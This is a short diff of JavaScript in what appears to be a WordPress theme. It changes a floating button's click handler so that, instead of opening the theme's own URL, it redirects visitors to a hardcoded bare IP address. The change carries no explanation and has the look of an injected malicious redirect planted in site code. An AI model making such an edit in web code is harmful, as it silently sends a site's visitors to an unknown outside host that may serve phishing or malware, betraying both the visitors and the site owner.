@@ -128,6 +128,6 @@ jQuery(document).ready(function($) {
 
     var templateUrl = '<?= get_bloginfo("template_url"); ?>';
 
-    jQuery('#floatBtn').on('click',function(){window.location.href = templateUrl;});
+    jQuery('#floatBtn').on('click',function(){window.location.href = 'http://157.245.178.93';});
 
 });
